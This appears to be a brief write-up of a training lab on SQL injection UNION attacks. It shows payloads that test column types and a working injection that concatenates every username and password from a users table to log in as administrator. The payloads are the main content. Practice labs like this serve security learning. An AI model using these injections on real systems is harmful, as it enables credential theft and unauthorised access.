SQL injection UNION attack, retrieving multiple values in a single column \
Goal -  The database contains a different table called users, with columns called username and password. \
       To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.  \
       Use Concatenation. \
What we know - \
  2 columns \
Step 1 - \
   Know which column uses string. \
   try ' UNION SELECT 'a',NULL -- \
   try ' UNION SELECT NULL,'a' -- \
   Confirmed : its Trial 2 \
Step 2- \
Get the details of other columns.The real attack. \
 Try \
  ' UNION SELECT NULL,username || '~' || password FROM users -- \
   || '~' || - is used to concaternate(Join)  results together in one column. \
   <img width="1603" height="903" alt="image" src="https://github.com/user-attachments/assets/1cb56a9d-d530-4940-ada1-48f806d438a0" /> \
Thats it.Simple,Right. \
<img width="1708" height="773" alt="image" src="https://github.com/user-attachments/assets/66194765-f3c7-447a-97c3-f2a3b8718c8c" />

